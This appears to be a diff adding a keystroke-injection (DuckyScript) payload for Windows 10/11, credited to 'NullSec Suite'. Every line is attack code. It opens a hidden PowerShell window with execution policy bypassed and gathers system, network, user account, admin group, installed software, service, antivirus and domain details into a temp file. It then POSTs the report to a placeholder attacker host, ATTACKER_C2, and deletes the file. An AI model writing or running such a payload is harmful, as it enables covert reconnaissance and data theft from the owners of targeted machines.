@@ -1,0 +1,119 @@
+REM ==========================================
+REM Title: Complete System Inventory & Exfil
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Performs a comprehensive system
+REM   inventory including hardware, software,
+REM   network, user accounts, security config,
+REM   installed apps, running services, and
+REM   cloud connectivity. Compiles into a
+REM   detailed report and exfiltrates to C2.
+REM Category: Discovery / Collection
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Set variables
+STRING $report = "$env:TEMP\inventory_$(Get-Date -Format 'yyyyMMdd_HHmm').txt"
+ENTER
+DELAY 350
+STRING $exfilUrl = 'https://ATTACKER_C2/collect'
+ENTER
+DELAY 350
+REM Initialize report with header
+STRING "=" * 60 | Out-File $report -Force
+ENTER
+DELAY 300
+STRING "SYSTEM INVENTORY REPORT - $(Get-Date)" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING "=" * 60 | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 1: OS and Hardware
+STRING "`n[OS & HARDWARE]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime | Format-List | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-CimInstance Win32_ComputerSystem | Select Manufacturer,Model,TotalPhysicalMemory,Domain,PartOfDomain | Format-List | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-CimInstance Win32_Processor | Select Name,NumberOfCores,NumberOfLogicalProcessors | Format-List | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 2: Network Configuration
+STRING "`n[NETWORK]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-NetIPAddress -AddressFamily IPv4 | Select InterfaceAlias,IPAddress,PrefixLength | Format-Table | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select NextHop,InterfaceAlias | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-DnsClientServerAddress | Select InterfaceAlias,ServerAddresses | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 3: User Accounts
+STRING "`n[USER ACCOUNTS]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-LocalUser | Select Name,Enabled,LastLogon,PasswordLastSet | Format-Table | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | Select Name,ObjectClass | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 4: Installed Software
+STRING "`n[INSTALLED SOFTWARE]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion,Publisher | Sort DisplayName | Format-Table -AutoSize | Out-File $report -Append -Width 200
+ENTER
+DELAY 500
+REM Section 5: Running Services
+STRING "`n[RUNNING SERVICES]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-Service | Where-Object { $_.Status -eq 'Running' } | Select Name,DisplayName | Format-Table | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 6: Security Products
+STRING "`n[SECURITY PRODUCTS]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select displayName,productState | Out-File $report -Append
+ENTER
+DELAY 400
+STRING Get-MpComputerStatus -ErrorAction SilentlyContinue | Select AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 7: Cloud & Domain Status
+STRING "`n[CLOUD & DOMAIN]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING dsregcmd /status 2>$null | Select-String 'AzureAd|Domain|Tenant|Device' | Out-File $report -Append
+ENTER
+DELAY 400
+REM Section 8: Scheduled Tasks (non-Microsoft)
+STRING "`n[CUSTOM SCHEDULED TASKS]" | Out-File $report -Append
+ENTER
+DELAY 300
+STRING Get-ScheduledTask | Where-Object { $_.Author -notlike '*Microsoft*' -and $_.State -ne 'Disabled' } | Select TaskName,Author,State | Format-Table | Out-File $report -Append
+ENTER
+DELAY 400
+REM Exfiltrate the full report
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile $report -ContentType 'text/plain' -Headers @{'X-Host'=$env:COMPUTERNAME;'X-Type'='inventory'} } catch {}
+ENTER
+DELAY 500
+REM Cleanup
+STRING Remove-Item $report -Force 2>$null
+ENTER
+DELAY 350
+STRING exit
+ENTER
